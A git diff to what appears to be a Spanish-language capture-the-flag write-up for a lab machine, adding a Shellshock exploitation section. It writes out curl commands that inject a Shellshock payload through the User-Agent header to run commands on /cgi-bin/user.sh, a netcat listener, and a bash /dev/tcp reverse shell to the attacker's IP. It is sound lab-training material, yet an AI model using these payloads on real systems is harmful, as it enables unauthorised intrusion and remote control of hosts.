@@ -93,4 +93,18 @@ Entramos al recurso /cgi-bin/user.sh
 </p>
 
 ## Intrusion a la maquina 
-para porder entrar a la maquina es necesario un ataque shellshock
+Para ganar acceso a la maquina realizaremos un ataque ShellShock 
+en esta mapa en especifico habra que probar hacer un aislamiento de comandos con echo;
+### Ganamos ejecucion remota de comandos
+```
+curl -H "User-Agent: () { :; }; echo; echo; /usr/bin/whoami" http://10.10.10.56/cgi-bin/user.sh
+```
+### Ganamos una shell 
+Nos ponemos en escucha con netcat 
+```
+nc -nlvp 443
+```
+Ahora ganamos la shell
+```
+curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -l >& /dev/tcp/(nuestra ip)/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
+```
